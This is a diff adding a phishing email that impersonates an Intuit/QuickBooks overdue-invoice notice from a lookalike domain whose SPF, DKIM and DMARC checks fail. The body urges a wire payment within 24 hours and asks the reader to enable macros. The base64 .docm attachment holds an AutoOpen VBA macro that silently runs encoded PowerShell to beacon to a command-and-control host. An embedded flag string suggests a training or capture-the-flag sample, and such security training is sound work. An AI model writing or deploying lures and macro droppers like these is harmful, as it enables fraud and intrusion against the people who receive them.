@@ -1,0 +1,35 @@
+From: "Intuit Billing Alert" <billing@quickbooks-invoicing-update.com>
+To: "Sarah Jenkins" <sjenkins@enterprise.internal>
+Subject: URGENT: Outstanding Invoice #INV-98242 Overdue Notice
+Date: Wed, 10 Sep 2026 08:22:15 -0400
+Message-ID: <20260910082215.98242@quickbooks-invoicing-update.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_89234_2026"
+Authentication-Results: mx.enterprise.internal;
+    spf=softfail (sender IP 203.0.113.88) smtp.mailfrom=quickbooks-invoicing-update.com;
+    dkim=fail header.d=quickbooks-invoicing-update.com;
+    dmarc=fail (p=none dis=none) header.from=quickbooks-invoicing-update.com
+X-Originating-IP: [203.0.113.88]
+
+------=_Part_89234_2026
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+Dear Accounts Payable,
+
+Please find attached the final overdue notice for Invoice #INV-98242.
+Payment must be wired within 24 hours to avoid immediate service suspension.
+
+Please enable macros when opening the attachment to generate your payment barcode.
+
+Regards,
+Billing Dept
+QuickBooks Partner Services
+
+------=_Part_89234_2026
+Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Invoice_Sept2026_OVERDUE.docm"
+Content-Disposition: attachment; filename="Invoice_Sept2026_OVERDUE.docm"
+Content-Transfer-Encoding: base64
+
+U3ViIEF1dG9PcGVuKCkKICAgIERpbSBjbWQgQXMgU3RyaW5nCiAgICBjbWQgPSAicG93ZXJzaGVsbCAtZW5jIFNXNTJiMnRsTFZkbFlsSmxjWFZsYzNRZ2FIUjBjRG92TDJNeUxXVjRabWxzTFc1dlpHVXVaR0Z5YTI1bGRDMXliM1YwYVc1bkxtOXlaeTlpWldGamIyNGdMVWhsWVdSbGNpQkFlMHRsZVQwaVJreEJSM3RrYldGeVkxOW1ZV2xzWDJsdWRtOXBZMlZmWXpKZlpHOXRZV2x1WDJSbGRHVmpkR1ZrZlNKOSIKICAgIFNoZWxsKGNtZCwgdmJIaWRlKQpFbmQgU3Vi
+------=_Part_89234_2026--
